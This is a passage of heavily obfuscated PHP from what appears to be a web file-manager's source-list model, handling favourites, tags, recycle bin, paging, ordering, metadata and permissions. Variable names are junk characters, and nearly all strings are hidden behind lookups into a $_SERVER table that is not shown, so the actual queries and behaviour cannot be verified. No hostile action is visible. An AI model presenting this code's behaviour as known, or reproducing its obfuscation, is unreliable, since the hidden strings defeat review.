$½ô—›Ö = false) { return Cache::set($this->cacheKey($Ÿ±€²¶), $½ô—›Ö); } public function cacheGet($®—¥œœ€) { return Cache::get($this->cacheKey($®—¥œœ€)); } public function cacheRemove($ É¬¨ú) { return Cache::remove($this->cacheKey($ É¬¨ú)); } protected function filterWhere($˜ùèÒİŒ) { return $˜ùèÒİŒ; } protected function cacheKey($âÌüœ½) { return $âÌüœ½; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\x72\x63\145"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\141\155\145" => "\151\x6f\x5f\163\157\x75\162\x63\x65\x5f\x6d\x65\x74\x61", "\155\x65\x74\141\106\x69\145\x6c\144" => "\163\157\x75\x72\x63\x65\111\x44"); protected $dataAuto = array(array("\155\157\x64\151\x66\171\124\x69\155\145", "\x74\x69\x6d\145", "\x69\x6e\163\145\162\x74", "\146\x75\x6e\x63\x74\151\x6f\x6e"), array("\x63\162\x65\141\x74\x65\124\151\x6d\x65", "\x74\x69\x6d\145", "\x69\156\x73\x65\x72\164", "\146\165\x6e\x63\x74\151\x6f\156"), array("\x76\151\x65\167\x54\x69\155\x65", "\x74\x69\155\x65", "\151\156\163\145\162\164", "\146\165\x6e\143\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($‘©êé—¥) { return $this->listSource(array($_SERVER[¦»×‡Ãã][477] => $‘©êé—¥)); } public function typeName($— ³ÒšŒ) { static $¦£¾¥ÑŸ = array(self::TYPE_SYSTEM => "\163\x79\163\x74\x65\155", self::TYPE_USER => "\165\x73\x65\162", self::TYPE_GROUP => "\147\162\x6f\165\160"); return $¦£¾¥ÑŸ[$— ³ÒšŒ . $_SERVER[¦»×‡Ãã][12]]; } public function sourceListInfo($†¶Ó§ìÔ, $»°ù¹Ş‚ = false) { $­ÂÄÏŒÚ =& $_SERVER[¦»×‡Ãã]; $†¶Ó§ìÔ = $†¶Ó§ìÔ ? $†¶Ó§ìÔ : array(); $†¶Ó§ìÔ = array_filter(array_unique($†¶Ó§ìÔ)); if (!$†¶Ó§ìÔ) { return array(); } $úÇšÈÛ† = $this->where(array($­ÂÄÏŒÚ[193] => array($­ÂÄÏŒÚ[7], $†¶Ó§ìÔ)))->select(); $this->_listDataApply($úÇšÈÛ†, $»°ù¹Ş‚); return array_to_keyvalue($úÇšÈÛ†, $­ÂÄÏŒÚ[193]); } public function pathInfoFilter(&$µÚ„è“á) { $’…ë¬¤ =& $_SERVER[¦»×‡Ãã]; static $Ÿ¹•£í— = false; static $¤Š¢´Ë = false; static $›ªÂİ—Ô = false; if (!$Ÿ¹•£í—) { $ª•«Œ¸² = $’…ë¬¤[478]; $ª•«Œ¸² .= $’…ë¬¤[479]; $ª•«Œ¸² .= $’…ë¬¤[480]; $ôğ£Üüô = $’…ë¬¤[481]; $¾†ä§˜ = explode($’…ë¬¤[50], $ôğ£Üüô); $Ÿ¹•£í— = explode($’…ë¬¤[50], $ª•«Œ¸²); $¤Š¢´Ë = array(); foreach ($Ÿ¹•£í— as $©½åÈ—§) { if (in_array($©½åÈ—§, $¾†ä§˜)) { continue; } $¤Š¢´Ë[] = $©½åÈ—§; } $›ªÂİ—Ô = explode($’…ë¬¤[50], $’…ë¬¤[482]); } foreach ($›ªÂİ—Ô as $Ìä¢Å™Ï) { if (isset($µÚ„è“á[$Ìä¢Å™Ï])) { $µÚ„è“á[$Ìä¢Å™Ï] = intval($µÚ„è“á[$Ìä¢Å™Ï]); } } $µÚ„è“á[$’…ë¬¤[87]] = $’…ë¬¤[483] . $µÚ„è“á[$’…ë¬¤[193]] . $’…ë¬¤[484]; $µÚ„è“á[$’…ë¬¤[33]] = $µÚ„è“á[$’…ë¬¤[485]] == 1 ? $’…ë¬¤[78] : $’…ë¬¤[230]; $µÚ„è“á[$’…ë¬¤[190]] = $this->typeName($µÚ„è“á[$’…ë¬¤[190]]); if ($µÚ„è“á[$’…ë¬¤[485]] != 1) { $µÚ„è“á[$’…ë¬¤[169]] = $µÚ„è“á[$’…ë¬¤[486]]; unset($µÚ„è“á[$’…ë¬¤[486]]); } $”Üø¤õ„ = $Ÿ¹•£í—; if (isset($µÚ„è“á[$’…ë¬¤[487]]) && $µÚ„è“á[$’…ë¬¤[487]][$’…ë¬¤[488]] == -1) { $”Üø¤õ„ = $¤Š¢´Ë; } $µÚ„è“á = array_field_key($µÚ„è“á, $”Üø¤õ„); return $µÚ„è“á; } public function listUserFav() { $×Ú†»´ =& $_SERVER[¦»×‡Ãã]; $êÄÉ›úÏ = Model($×Ú†»´[489])->listData(); $ä®Ãö ù = array_filter_by_field($êÄÉ›úÏ, $×Ú†»´[33], $×Ú†»´[490]); $ä®Ãö ù = array_to_keyvalue($ä®Ãö ù, $×Ú†»´[12], $×Ú†»´[87]); if ($ä®Ãö ù) { $áÜ÷Æ–ç = $this->listSource(array($×Ú†»´[491] => array($×Ú†»´[492], $ä®Ãö ù))); } $áÜ÷Æ–ç = array_to_keyvalue($áÜ÷Æ–ç[$×Ú†»´[445]], $×Ú†»´[193]); foreach ($êÄÉ›úÏ as &$ù’İÄ™) { $ù’İÄ™ = array($×Ú†»´[493] => $ù’İÄ™[$×Ú†»´[475]], $×Ú†»´[494] => $ù’İÄ™[$×Ú†»´[32]], $×Ú†»´[495] => $ù’İÄ™[$×Ú†»´[87]], $×Ú†»´[496] => $ù’İÄ™[$×Ú†»´[33]], $×Ú†»´[497] => $ù’İÄ™[$×Ú†»´[231]], $×Ú†»´[498] => $ù’İÄ™[$×Ú†»´[88]]); if ($ù’İÄ™[$×Ú†»´[33]] == $×Ú†»´[490] && $áÜ÷Æ–ç[$ù’İÄ™[$×Ú†»´[87]]]) { $ù’İÄ™[$×Ú†»´[90]] = $áÜ÷Æ–ç[$ù’İÄ™[$×Ú†»´[87]]]; } } unset($ù’İÄ™); return $êÄÉ›úÏ; } public function listUserTag($ã—ìÂıÒ) { $˜ù²Ñ¶ =& $_SERVER[¦»×‡Ãã]; if ($ã—ìÂıÒ && !is_array($ã—ìÂıÒ)) { $ã—ìÂıÒ = array($ã—ìÂıÒ); } $°‡×‡Â÷ = Model($˜ù²Ñ¶[499])->listData(); $ÔÚÊ‰ç = array(); $ú­ïŠ¼Ş = array(); foreach ($°‡×‡Â÷ as $¢Å£‰òü) { $²“«áœˆ = $¢Å£‰òü[$˜ù²Ñ¶[87]]; if (!$²“«áœˆ) { continue; } if (!isset($ú­ïŠ¼Ş[$²“«áœˆ])) { $ú­ïŠ¼Ş[$²“«áœˆ] = array(); } $ú­ïŠ¼Ş[$²“«áœˆ][] = $¢Å£‰òü[$˜ù²Ñ¶[500]]; $ÔÚÊ‰ç[$¢Å£‰òü[$˜ù²Ñ¶[87]]] = $¢Å£‰òü; } $«™¯åƒı = array(); $Î®éËÖ¾ = array(); $€Á³ì = array(); foreach ($ú­ïŠ¼Ş as $ÂÛºâÍü => $à„°Ù) { $³¡££Ï = !0; if (!$ã—ìÂıÒ) { $«™¯åƒı[] = $ÂÛºâÍü; continue; } foreach ($ã—ìÂıÒ as $Ş¡š²ã½) { if (!in_array($Ş¡š²ã½, $à„°Ù)) { $³¡££Ï = !1; break; } } if (!$³¡££Ï) { continue; } if (!is_numeric($ÂÛºâÍü)) { $ÊÆ¾é˜ = $ÔÚÊ‰ç[$ÂÛºâÍü]; $† ØÎç = array($˜ù²Ñ¶[32] => $ÊÆ¾é˜[$˜ù²Ñ¶[32]], $˜ù²Ñ¶[87] => $ÊÆ¾é˜[$˜ù²Ñ¶[87]], $˜ù²Ñ¶[33] => $ÊÆ¾é˜[$˜ù²Ñ¶[33]], $˜ù²Ñ¶[90] => array($˜ù²Ñ¶[501] => 1), $˜ù²Ñ¶[232] => !0); if ($ÊÆ¾é˜[$˜ù²Ñ¶[33]] == $˜ù²Ñ¶[230]) { $€Á³ì[] = $† ØÎç; } if ($ÊÆ¾é˜[$˜ù²Ñ¶[33]] == $˜ù²Ñ¶[78]) { $Î®éËÖ¾[] = $† ØÎç; } continue; } $«™¯åƒı[] = $ÂÛºâÍü; } if ($«™¯åƒı) { $¬Öäï—Œ = $this->listSource(array($˜ù²Ñ¶[491] => array($˜ù²Ñ¶[492], $«™¯åƒı))); } $¬Öäï—Œ = $¬Öäï—Œ ? $¬Öäï—Œ : array($˜ù²Ñ¶[85] => array(), $˜ù²Ñ¶[86] => array()); $¬Öäï—Œ[$˜ù²Ñ¶[85]] = array_merge($¬Öäï—Œ[$˜ù²Ñ¶[85]], $Î®éËÖ¾); $¬Öäï—Œ[$˜ù²Ñ¶[86]] = array_merge($¬Öäï—Œ[$˜ù²Ñ¶[86]], $€Á³ì); if (isset($¬Öäï—Œ[$˜ù²Ñ¶[442]]) && count($«™¯åƒı) == $¬Öäï—Œ[$˜ù²Ñ¶[442]][$˜ù²Ñ¶[443]]) { return $¬Öäï—Œ; } $Öû¾±Œ = array(); $†àµ“Õ = array_to_keyvalue($¬Öäï—Œ[$˜ù²Ñ¶[85]], $˜ù²Ñ¶[12], $˜ù²Ñ¶[193]); $Ïä¨¿Á• = array_to_keyvalue($¬Öäï—Œ[$˜ù²Ñ¶[86]], $˜ù²Ñ¶[12], $˜ù²Ñ¶[193]); $óË½Çî± = array_merge($Ïä¨¿Á•, $†àµ“Õ); foreach ($«™¯åƒı as $²“«áœˆ) { if (!in_array($²“«áœˆ, $óË½Çî±)) { $Öû¾±Œ[] = $²“«áœˆ; } } if ($Öû¾±Œ) { Model($˜ù²Ñ¶[502])->removeBySource($Öû¾±Œ); } return $¬Öäï—Œ; } public function listUserRecycle() { $•ºñ‰³¦ =& $_SERVER[¦»×‡Ãã]; $Ä†—ìú = Model($•ºñ‰³¦[503])->listData(); if (!$Ä†—ìú) { return array(); } $¢ŒÙàã¹ = array($•ºñ‰³¦[491] => array($•ºñ‰³¦[492], $Ä†—ìú), $•ºñ‰³¦[504] => 1); return $this->listSource($¢ŒÙàã¹); } public function listSource($ƒ ª®è, $ÅÅÉ£ÅØ = 3000, $ù«Ä§¿Û = false) { $‰şÔìÔ” =& $_SERVER[¦»×‡Ãã]; if (!isset($ƒ ª®è[$‰şÔìÔ”[505]])) { $ƒ ª®è[$‰şÔìÔ”[505]] = 0; } if (isset($ƒ ª®è[$‰şÔìÔ”[192]]) && $ƒ ª®è[$‰şÔìÔ”[192]] == $‰şÔìÔ”[228]) { $ƒ ª®è[$‰şÔìÔ”[486]] = array($‰şÔìÔ”[407], $‰şÔìÔ”[506]); } $º‘ğñ’¤ = $‰şÔìÔ”[507]; $Ÿ‘«¯úÕ = $this->field($º‘ğñ’¤)->_makeOrder()->where($ƒ ª®è)->selectPage($ÅÅÉ£ÅØ); $this->_listPageCheck($Ÿ‘«¯úÕ, $º‘ğñ’¤, $ƒ ª®è); $this->_listDataApply($Ÿ‘«¯úÕ[$‰şÔìÔ”[445]], $ù«Ä§¿Û); $this->_listMake($Ÿ‘«¯úÕ); return $Ÿ‘«¯úÕ; } private function _listPageCheck(&$ÕüïÑ¨˜, $ÖıÊ†òô, $­€êÕ‹ô) { $‘®äØŸæ =& $_SERVER[¦»×‡Ãã]; if (!is_array($ÕüïÑ¨˜[$‘®äØŸæ[442]])) { return; } $æ¶öı¢ß = $ÕüïÑ¨˜[$‘®äØŸæ[442]]; if ($æ¶öı¢ß[$‘®äØŸæ[444]] <= 1) { return; } if ($æ¶öı¢ß[$‘®äØŸæ[443]] >= 100000) { return; } if (Model($‘®äØŸæ[508])->get($‘®äØŸæ[509]) != $‘®äØŸæ[510]) { return; } $ÖıÊ†òô = str_replace(array($‘®äØŸæ[53], $‘®äØŸæ[418], $‘®äØŸæ[262]), $‘®äØŸæ[12], $ÖıÊ†òô); $ÖıÊ†òô = $‘®äØŸæ[511] . str_replace($‘®äØŸæ[50], $‘®äØŸæ[512], $ÖıÊ†òô) . $‘®äØŸæ[513]; $ƒ•º¹¤‚ = $‘®äØŸæ[514]; $ƒ•º¹¤‚ = $ƒ•º¹¤‚ . $‘®äØŸæ[515]; $ŞÉ½÷ƒ« = $æ¶öı¢ß[$‘®äØŸæ[439]] * ($æ¶öı¢ß[$‘®äØŸæ[429]] - 1) . $‘®äØŸæ[50] . $æ¶öı¢ß[$‘®äØŸæ[439]]; $™ùĞ¾¼ = $this->_makeOrder(!0); $ÑÜİúÓ = $‘®äØŸæ[511] . str_replace($‘®äØŸæ[50], $‘®äØŸæ[512], $™ùĞ¾¼[0]); if (strpos($ÑÜİúÓ, $‘®äØŸæ[516])) { $ÑÜİúÓ = str_replace($‘®äØŸæ[516], $‘®äØŸæ[517], $ÑÜİúÓ); } else { $ÑÜİúÓ .= $‘®äØŸæ[518] . $™ùĞ¾¼[1]; } $´Àö‘©Ê = array(); foreach ($­€êÕ‹ô as $Óáõ¾¤ => $Ì²ôŞ¢î) { $´Àö‘©Ê[$‘®äØŸæ[511] . $Óáõ¾¤] = $Ì²ôŞ¢î; } $this->alias($‘®äØŸæ[519])->field($ÖıÊ†òô)->limit($ŞÉ½÷ƒ«)->order($ÑÜİúÓ); $‰˜ÊâÄÕ = $this->join($ƒ•º¹¤‚)->where($´Àö‘©Ê)->select(); if ($‰˜ÊâÄÕ) { $ÕüïÑ¨˜[$‘®äØŸæ[445]] = $‰˜ÊâÄÕ; } } protected function _makeOrder($…«©ÍûÇ = false) { $îíÅıî® =& $_SERVER[¦»×‡Ãã]; $ß÷á®üò = Model($îíÅıî®[520])->get($îíÅıî®[521]); $Õ•´Û = Model($îíÅıî®[520])->get($îíÅıî®[522]); $ıùı€¥ = array($îíÅıî®[523] => $îíÅıî®[524], $îíÅıî®[525] => $îíÅıî®[526]); $Öİœîñ = array($îíÅıî®[32] => $îíÅıî®[32], $îíÅıî®[79] => $îíÅıî®[79], $îíÅıî®[169] => $îíÅıî®[486], $îíÅıî®[527] => $îíÅıî®[527], $îíÅıî®[528] => $îíÅıî®[529], $îíÅıî®[231] => $îíÅıî®[231], $îíÅıî®[88] => $îíÅıî®[88]); $®Ö¹ó™ = Input::get($îíÅıî®[530], $îíÅıî®[7], $ß÷á®üò, array_keys($Öİœîñ)); $ƒ¡óØç« = Input::get($îíÅıî®[531], $îíÅıî®[7], $Õ•´Û, array_keys($ıùı€¥)); if (!in_array($®Ö¹ó™, array_keys($Öİœîñ))) { $®Ö¹ó™ = $îíÅıî®[32]; } if (!in_array($ƒ¡óØç«, array_keys($ıùı€¥))) { $®Ö¹ó™ = $îíÅıî®[523]; } if ($®Ö¹ó™ == $îíÅıî®[32]) { } $ï¼Üàş = $îíÅıî®[532] . $Öİœîñ[$®Ö¹ó™] . $îíÅıî®[53] . $ıùı€¥[$ƒ¡óØç«]; $ï¼Üàş = rtrim(trim($ï¼Üàş), $îíÅıî®[50]); if ($…«©ÍûÇ) { return array($ï¼Üàş, $ıùı€¥[$ƒ¡óØç«]); } return $this->order($ï¼Üàş); } protected function _listDataApplyItem($¾÷Ì†¸ø, $ É¤ ûâ = false) { $ÎÅ‚ğåü = array($¾÷Ì†¸ø); $this->_listDataApply($ÎÅ‚ğåü, $ É¤ ûâ); return $ÎÅ‚ğåü[0]; } protected function _listDataApply(&$¤¸ªÛ˜¯, $ê²³Œüõ = false) { $¯¸û÷úÙ =& $_SERVER[¦»×‡Ãã]; if (!$¤¸ªÛ˜¯) { $¤¸ªÛ˜¯ = array(); return; } $†èˆ¬òí = array_to_keyvalue($¤¸ªÛ˜¯, $¯¸û÷úÙ[12], $¯¸û÷úÙ[193]); $†èˆ¬òí = array_unique($†èˆ¬òí); $this->_listSourceCache($¤¸ªÛ˜¯); if (!$ê²³Œüõ) { $this->_listAppendMeta($¤¸ªÛ˜¯, $†èˆ¬òí); $this->_listAppendFileMeta($¤¸ªÛ˜¯, $†èˆ¬òí); $this->_listAppendChildren($¤¸ªÛ˜¯, $†èˆ¬òí); } $this->_listAppendPath($¤¸ªÛ˜¯); $this->_listAppendAuth($¤¸ªÛ˜¯); $this->_listAppendSourceInfo($¤¸ªÛ˜¯, $†èˆ¬òí); $this->_listAppendUser($¤¸ªÛ˜¯); $this->_listFilterInfo($¤¸ªÛ˜¯, $ê²³Œüõ); $this->_listAppendAuthSecret($¤¸ªÛ˜¯); } protected function _listSourceCache($³­¼ÆËÚ) { $Ú¤Ó×ä =& $_SERVER[¦»×‡Ãã]; foreach ($³­¼ÆËÚ as $Úà²ùÂ¬) { self::$cacheSourceInfo[$Ú¤Ó×ä[533] . $Úà²ùÂ¬[$Ú¤Ó×ä[193]]] = $Úà²ùÂ¬; } } protected function _listFilterInfo(&$° ¦¨Ò¾, $Ñ¥¼Ñ¥ç = false) { $Ã›Ÿ¼àê =& $_SERVER[¦»×‡Ãã]; foreach ($° ¦¨Ò¾ as &$Õ£àò›) { $Õ£àò› = $this->pathInfoFilter($Õ£àò›); self::$cachePathInfo[$Ã›Ÿ¼àê[534] . intval($Ñ¥¼Ñ¥ç) . $Ã›Ÿ¼àê[462] . $Õ£àò›[$Ã›Ÿ¼àê[193]]] = $Õ£àò›; } unset($Õ£àò›); } protected function _listMake(&$¢­ªê) { $õÂŞÊÙò =& $_SERVER[¦»×‡Ãã]; $¢­ªê[$õÂŞÊÙò[85]] = array(); $¢­ªê[$õÂŞÊÙò[86]] = array(); foreach ($¢­ªê[$õÂŞÊÙò[445]] as $ Å§ ß ) { $¯º‰¿ºÄ = $ Å§ ß [$õÂŞÊÙò[485]] == 1 ? $õÂŞÊÙò[85] : $õÂŞÊÙò[86]; $¢­ªê[$¯º‰¿ºÄ][] = $ Å§ ß ; } unset($¢­ªê[$õÂŞÊÙò[445]]); } protected function _listAppendMeta(&$· Ô²ñÅ, $à›Áì“‚) { $¡ÎİïÂĞ =& $_SERVER[¦»×‡Ãã]; $Î™»¤¢” = array($¡ÎİïÂĞ[491] => array($¡ÎİïÂĞ[492], $à›Áì“‚)); $¿Ú¨±´ä = Model($¡ÎİïÂĞ[535])->field($¡ÎİïÂĞ[536])->where($Î™»¤¢”)->select(); if (!$¿Ú¨±´ä) { return; } $¹®äØ¡ı = array($¡ÎİïÂĞ[537], $¡ÎİïÂĞ[538], $¡ÎİïÂĞ[517]); $ù£Æ”æÄ = array(); foreach ($¿Ú¨±´ä as $Áó—Õğ¤) { if (!isset($ù£Æ”æÄ[$Áó—Õğ¤[$¡ÎİïÂĞ[193]]])) { $ù£Æ”æÄ[$Áó—Õğ¤[$¡ÎİïÂĞ[193]]] = array(); } if (in_array($Áó—Õğ¤[$¡ÎİïÂĞ[97]], $¹®äØ¡ı)) { continue; } $ù£Æ”æÄ[$Áó—Õğ¤[$¡ÎİïÂĞ[193]]][$Áó—Õğ¤[$¡ÎİïÂĞ[97]]] = $Áó—Õğ¤[$¡ÎİïÂĞ[450]]; } foreach ($· Ô²ñÅ as &$¾çâÉ©•) { $¾çâÉ©•[$¡ÎİïÂĞ[539]] = !1; if (isset($ù£Æ”æÄ[$¾çâÉ©•[$¡ÎİïÂĞ[193]]])) { $¾çâÉ©•[$¡ÎİïÂĞ[539]] = $ù£Æ”æÄ[$¾çâÉ©•[$¡ÎİïÂĞ[193]]]; } if ($this->fileIsLock($¾çâÉ©•) && $¾çâÉ©•[$¡ÎİïÂĞ[487]]) { $³‚™ØÒü = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¾çâÉ©•[$¡ÎİïÂĞ[487]][$¡ÎİïÂĞ[488]] = AuthModel::authDisable($¾çâÉ©•[$¡ÎİïÂĞ[487]][$¡ÎİïÂĞ[488]], $³‚™ØÒü); $¾çâÉ©•[$¡ÎİïÂĞ[487]][$¡ÎİïÂĞ[540]][$¡ÎİïÂĞ[487]] = $¾çâÉ©•[$¡ÎİïÂĞ[487]][$¡ÎİïÂĞ[488]]; } } unset($¾çâÉ©•); } protected function _listAppendFileMeta(&$€‹º©¶Ë, $­Ç“Úë•) { $²’Ô®²ï =& $_SERVER[¦»×‡Ãã]; $ö¿‰Ç¨Ô = array_to_keyvalue($€‹º©¶Ë, $²’Ô®²ï[12], $²’Ô®²ï[541]); $ö¿‰Ç¨Ô = array_filter(array_unique($ö¿‰Ç¨Ô)); if (!$ö¿‰Ç¨Ô) { return; } $ÅÆàºÂë = array($²’Ô®²ï[542] => array($²’Ô®²ï[492], $ö¿‰Ç¨Ô)); $Áµ˜¨¤ = $²’Ô®²ï[543]; $—ÌïÏÂ¹ = Model($²’Ô®²ï[544])->field($Áµ˜¨¤)->where($ÅÆàºÂë)->select(); $—ÌïÏÂ¹ = array_to_keyvalue($—ÌïÏÂ¹, $²’Ô®²ï[541]); $ò©’´áÎ = Model($²’Ô®²ï[545])->field($²’Ô®²ï[546])->where($ÅÆàºÂë)->select(); $ò©’´áÎ = $ò©’´áÎ ? $ò©’´áÎ : array(); $¢ë—”»¿ = array(); foreach ($ò©’´áÎ as $ù­í°Ì‡) { if (!isset($¢ë—”»¿[$ù­í°Ì‡[$²’Ô®²ï[541]]])) { $¢ë—”»¿[$ù­í°Ì‡[$²’Ô®²ï[541]]] = array(); } $¢ë—”»¿[$ù­í°Ì‡[$²’Ô®²ï[541]]][$ù­í°Ì‡[$²’Ô®²ï[97]]] = $ù­í°Ì‡[$²’Ô®²ï[450]]; } foreach ($€‹º©¶Ë as &$ôÀÁÁÁÜ) { $Ç…öËìæ = $ôÀÁÁÁÜ[$²’Ô®²ï[541]]; if (!$Ç…öËìæ || !is_array($—ÌïÏÂ¹[$Ç…öËìæ])) { continue; } $˜çæË·Ò = $—ÌïÏÂ¹[$Ç…öËìæ]; $˜çæË·Ò[$²’Ô®²ï[79]] = $ôÀÁÁÁÜ[$²’Ô®²ï[79]]; $˜çæË·Ò[$²’Ô®²ï[32]] = $ôÀÁÁÁÜ[$²’Ô®²ï[32]]; if (!$˜çæË·Ò[$²’Ô®²ï[547]]) { Model($²’Ô®²ï[544])->fileMd5Check($˜çæË·Ò); } if (!isset(self::$cacheFileInfo[$²’Ô®²ï[548] . $Ç…öËìæ])) { self::$cacheFileInfo[$²’Ô®²ï[548] . $Ç…öËìæ] = array_merge(array(), $˜çæË·Ò); } unset($—ÌïÏÂ¹[$Ç…öËìæ][$²’Ô®²ï[87]]); $ôØâ½· = isset($¢ë—”»¿[$Ç…öËìæ]) && is_array($¢ë—”»¿[$Ç…öËìæ]) ? $¢ë—”»¿[$Ç…öËìæ] : array(); $ôÀÁÁÁÜ[$²’Ô®²ï[170]] = array_merge($ôØâ½·, $—ÌïÏÂ¹[$Ç…öËìæ]); if (isset($ôÀÁÁÁÜ[$²’Ô®²ï[170]][$²’Ô®²ï[184]])) { $ôÀÁÁÁÜ[$²’Ô®²ï[184]] = json_decode($ôÀÁÁÁÜ[$²’Ô®²ï[170]][$²’Ô®²ï[184]], !0); unset($ôÀÁÁÁÜ[$²’Ô®²ï[170]][$²’Ô®²ï[184]]); } } unset($ôÀÁÁÁÜ); } protected function _listAppendSourceInfo(&$’©¢ïª…, $ ‹”¡‰) { $”ó‹ãØÜ =& $_SERVER[¦»×‡Ãã]; $Âí›â×É = Model($”ó‹ãØÜ[549])->listData(); $ôÀµ’»§ = Model($”ó‹ãØÜ[499])->listData(); $§”ãÛü³ = Model($”ó‹ãØÜ[489])->listData(); $ŞúıÊÆ„ = Model($”ó‹ãØÜ[550])->listSimple(); $‡ê®¤Ùö = array_to_keyvalue($Âí›â×É, $”ó‹ãØÜ[475]); $Óï ª¯ = array_to_keyvalue_group($ôÀµ’»§, $”ó‹ãØÜ[87], $”ó‹ãØÜ[500]); $³‡£ª§ = array_to_keyvalue($§”ãÛü³, $”ó‹ãØÜ[87]); $ñêà¯‘º = array_to_keyvalue_group($ŞúıÊÆ„, $”ó‹ãØÜ[193]); foreach ($’©¢ïª… as &$£Òã™‡) { $£Òã™‡[$”ó‹ãØÜ[90]] = array($”ó‹ãØÜ[551] => 0, $”ó‹ãØÜ[552] => 0, $”ó‹ãØÜ[553] => 0); if (isset($³‡£ª§[$£Òã™‡[$”ó‹ãØÜ[193]]])) { $£Òã™‡[$”ó‹ãØÜ[90]][$”ó‹ãØÜ[554]] = 1; $£Òã™‡[$”ó‹ãØÜ[90]][$”ó‹ãØÜ[555]] = $³‡£ª§[$£Òã™‡[$”ó‹ãØÜ[193]]][$”ó‹ãØÜ[32]]; } if ($Óï ª¯ && $‡ê®¤Ùö && isset($Óï ª¯[$£Òã™‡[$”ó‹ãØÜ[193]]])) { $£Òã™‡[$”ó‹ãØÜ[90]][$”ó‹ãØÜ[556]] = array(); foreach ($Óï ª¯[$£Òã™‡[$”ó‹ãØÜ[193]]] as $½ƒĞÛÄÒ) { $—œÒÉĞ = $‡ê®¤Ùö[$½ƒĞÛÄÒ]; $£Òã™‡[$”ó‹ãØÜ[90]][$”ó‹ãØÜ[556]][] = array($”ó‹ãØÜ[557] => $—œÒÉĞ[$”ó‹ãØÜ[475]], $”ó‹ãØÜ[494] => $—œÒÉĞ[$”ó‹ãØÜ[32]], $”ó‹ãØÜ[558] => $—œÒÉĞ[$”ó‹ãØÜ[559]]); } } if ($ñêà¯‘º && isset($ñêà¯‘º[$£Òã™‡[$”ó‹ãØÜ[193]]])) { $£Òã™‡[$”ó‹ãØÜ[90]][$”ó‹ãØÜ[560]] = array(); foreach ($ñêà¯‘º[$£Òã™‡[$”ó‹ãØÜ[193]]] as $úùÉ™Èã) { $ÌáŒ÷×õ = $”ó‹ãØÜ[561]; if ($úùÉ™Èã[$”ó‹ãØÜ[562]] == $”ó‹ãØÜ[91]) { $ÌáŒ÷×õ .= $”ó‹ãØÜ[563]; } $£Òã™‡[$”ó‹ãØÜ[90]][$”ó‹ãØÜ[560]] = array_field_key($úùÉ™Èã, explode($”ó‹ãØÜ[50], $ÌáŒ÷×õ)); } } } unset($£Òã™‡); return $’©¢ïª…; } protected function _listAppendChildren(&$ó§¾½ÒÀ, $—ÌºàóÓ) { $—è¢µõµ =& $_SERVER[¦»×‡Ãã]; $Ô…Çéäƒ = array(); $õÜö“Äº = array($—è¢µõµ[239] => 0, $—è¢µõµ[240] => 0); foreach ($ó§¾½ÒÀ as &$¼Áà±ß÷) { if (!$¼Áà±ß÷[$—è¢µõµ[485]]) { continue; } $Ô…Çéäƒ[] = $¼Áà±ß÷[$—è¢µõµ[193]]; } unset($¼Áà±ß÷); if (!$Ô…Çéäƒ) { return; } $€ú‰­–™ = array($—è¢µõµ[192] => array($—è¢µõµ[7], $Ô…Çéäƒ), $—è¢µõµ[505] => 0); $ÔÊú‚ = array($—è¢µõµ[192], $—è¢µõµ[485], $—è¢µõµ[564] => $—è¢µõµ[565]); $Úè†Âø = $this->field($ÔÊú‚)->where($€ú‰­–™)->group($—è¢µõµ[566])->select(); $“½•–é£ = array(); foreach ($Úè†Âø as $Ú°“Î) { $ÔîŠ“ÈÒ = $Ú°“Î[$—è¢µõµ[192]]; $¨Šáùà™ = $Ú°“Î[$—è¢µõµ[485]] == $—è¢µõµ[91] ? $—è¢µõµ[240] : $—è¢µõµ[239]; if (!isset($“½•–é£[$ÔîŠ“ÈÒ])) { $“½•–é£[$ÔîŠ“ÈÒ] = array($—è¢µõµ[239] => 0, $—è¢µõµ[240] => 0); } $“½•–é£[$ÔîŠ“ÈÒ][$¨Šáùà™] += $Ú°“Î[$—è¢µõµ[565]]; } foreach ($ó§¾½ÒÀ as &$¼Áà±ß÷) { if (!$¼Áà±ß÷[$—è¢µõµ[485]]) { continue; } $ÒÈÎú§Î = is_array($“½•–é£[$¼Áà±ß÷[$—è¢µõµ[193]]]) ? $“½•–é£[$¼Áà±ß÷[$—è¢µõµ[193]]] : $õÜö“Äº; $¼Áà±ß÷[$—è¢µõµ[240]] = $ÒÈÎú§Î[$—è¢µõµ[240]]; $¼Áà±ß÷[$—è¢µõµ[239]] = $ÒÈÎú§Î[$—è¢µõµ[239]]; unset($¼Áà±ß÷[$—è¢µõµ[486]]); } unset($¼Áà±ß÷); } protected function _listAppendAuth(&$ç åñ´) { $ÎÊˆÒ Æ =& $_SERVER[¦»×‡Ãã]; $ôÕÅÒ¿ô = array(); foreach ($ç åñ´ as $‘ş’ÈĞ) { if ($‘ş’ÈĞ[$ÎÊˆÒ Æ[190]] == self::TYPE_GROUP) { $ôÕÅÒ¿ô[] = $‘ş’ÈĞ[$ÎÊˆÒ Æ[193]]; } } if (!$ôÕÅÒ¿ô) { return; } $£‰¬¼ù¶ = array_to_keyvalue($ç åñ´, $ÎÊˆÒ Æ[193]); $ÓÉÓ£ù† = Model($ÎÊˆÒ Æ[567])->getSourceList($ôÕÅÒ¿ô, $£‰¬¼ù¶); $ÀËÍ£Ã¥ = KodUser::isRoot(); foreach ($ç åñ´ as $¾šåÂ˜ => &$‘ş’ÈĞ) { $‘ş’ÈĞ[$ÎÊˆÒ Æ[487]] = $ÓÉÓ£ù†[$‘ş’ÈĞ[$ÎÊˆÒ Æ[193]]]; if (!$‘ş’ÈĞ[$ÎÊˆÒ Æ[487]] && $‘ş’ÈĞ[$ÎÊˆÒ Æ[190]] == self::TYPE_GROUP) { $‘ş’ÈĞ[$ÎÊˆÒ Æ[487]] = Action($ÎÊˆÒ Æ[568])->pathGroupAuthMake($‘ş’ÈĞ[$ÎÊˆÒ Æ[569]]); if (!$‘ş’ÈĞ[$ÎÊˆÒ Æ[487]] && !$ÀËÍ£Ã¥) { $‘ş’ÈĞ[$ÎÊˆÒ Æ[233]] = !1; $‘ş’ÈĞ[$ÎÊˆÒ Æ[232]] = !1; } } if ($‘ş’ÈĞ[$ÎÊˆÒ Æ[487]]) { $‘ş’ÈĞ[$ÎÊˆÒ Æ[233]] = 